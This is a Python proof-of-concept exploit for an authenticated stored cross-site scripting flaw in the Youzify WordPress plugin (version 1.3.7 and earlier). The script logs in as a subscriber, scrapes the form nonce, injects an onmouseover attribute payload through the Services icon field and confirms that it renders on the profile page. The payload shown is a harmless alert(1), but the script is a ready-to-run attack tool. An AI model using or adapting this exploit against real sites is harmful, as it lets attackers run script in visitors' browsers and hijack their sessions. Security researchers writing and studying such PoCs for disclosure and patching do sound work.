#!/usr/bin/env python3
"""
Youzify <= 1.3.7 - Authenticated (Subscriber+) Stored XSS via Services icon.

  python3 poc.py --url http://localhost/wordpress --user subscriber --password 'subscriber'

Only `requests` is required: pip install requests
"""
import argparse
import getpass
import re
import sys
from urllib.parse import urljoin, urlparse

try:
    import requests
except ImportError:
    sys.exit("[-] missing dependency: pip install requests")

PAYLOAD_ICON = 'fas fa-globe" onmouseover="alert(1)'


def parse_args():
    p = argparse.ArgumentParser(description="Youzify 1.3.7 Stored XSS (services icon) PoC")
    p.add_argument("--url", required=True,
                   help="Site base (http://localhost/wordpress) OR own BuddyPress settings URL "
                        "(http://localhost/wordpress/members/subscriber/settings/)")
    p.add_argument("--user", default=None, help="Subscriber username (will prompt if omitted)")
    p.add_argument("--password", default=None, help="Subscriber password (will prompt if omitted)")
    p.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    p.add_argument("--debug", action="store_true", help="Print redirect Location and body snippet")
    return p.parse_args()


def split_base_and_settings(url):
    url = url.rstrip("/")
    if "/members/" in url:
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path[:parsed.path.find('/members/')]}"
        return base.rstrip("/"), url
    return url, None


def login(sess, base, user, password, verify):
    login_url = urljoin(base + "/", "wp-login.php")
    r = sess.post(login_url,
                  data={"log": user, "pwd": password, "wp-submit": "Log In",
                        "redirect_to": urljoin(base + "/", "wp-admin/"),
                        "testcookie": "1"},
                  allow_redirects=True, verify=verify, timeout=30)
    if not any("wordpress_logged_in_" in c for c in sess.cookies.get_dict()):
        print("[-] login failed, check --user/--password")
        print(f"    login_url={login_url} status={r.status_code}")
        sys.exit(1)
    print(f"[+] logged in as {user}")


def find_settings_url(sess, base, hint, user, verify):
    if hint:
        print(f"[+] using settings URL: {hint}")
        return hint
    for c in (f"{base}/members/{user.lower()}/settings/",
              f"{base}/members/{user.lower()}/profile/",
              f"{base}/members/{user.lower()}/"):
        try:
            r = sess.get(c, verify=verify, timeout=30)
            if r.status_code == 200 and ('name="security"' in r.text or "name='security'" in r.text):
                print(f"[+] found settings URL: {c}")
                return c
        except requests.RequestException:
            continue
    print(f"[!] nonce page not auto-found, falling back to profile page")
    return f"{base}/members/{user.lower()}/profile/"


def extract_nonce(html):
    for pat in (r'name=["\']security["\']\s+value=["\']([a-zA-Z0-9]+)["\']',
                r'value=["\']([a-zA-Z0-9]{10,})["\']\s+name=["\']security["\']'):
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return None


def main():
    a = parse_args()
    verify = not a.insecure
    if not a.user:
        a.user = input("[?] subscriber username: ").strip()
    if not a.password:
        a.password = getpass.getpass("[?] subscriber password: ")

    base, hint = split_base_and_settings(a.url)
    print(f"[+] target base: {base}")

    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0 (youzify-poc)"})
    login(sess, base, a.user, a.password, verify)

    settings_url = find_settings_url(sess, base, hint, a.user, verify)
    nonce = extract_nonce(sess.get(settings_url, verify=verify, timeout=30).text)
    if not nonce:
        sys.exit('[-] could not find nonce field name="security" on settings page.')
    print(f"[+] nonce: {nonce[:6]}...")

    data = {"action": "youzify_profile_settings_save_data",
            "security": nonce,
            "youzify_data[youzify-services-data]": "1",
            "youzify_services[1][title]": "x",
            "youzify_services[1][icon]": PAYLOAD_ICON,
            "youzify_services[1][description]": "x"}
    r = sess.post(settings_url, data=data, allow_redirects=False, verify=verify, timeout=30)
    print(f"[+] POST {settings_url} -> HTTP {r.status_code}")
    if a.debug:
        print(f"[*] Location: {r.headers.get('Location', '(none)')}")
        print(f"[*] body[:500]: {r.text[:500].replace(chr(10), ' ')}")

    ok = False
    for profile in (f"{base}/members/{a.user.lower()}/",
                    f"{base}/members/{a.user.lower()}/overview/"):
        try:
            h = sess.get(profile, verify=verify, timeout=30).text
            if PAYLOAD_ICON in h:
                print(f"[+] SUCCESS: payload reflected on {profile}")
                ok = True
                break
        except requests.RequestException:
            continue
    if not ok:
        print("[-] payload not seen; check Services widget is enabled/visible on profile.")


if __name__ == "__main__":
    main()
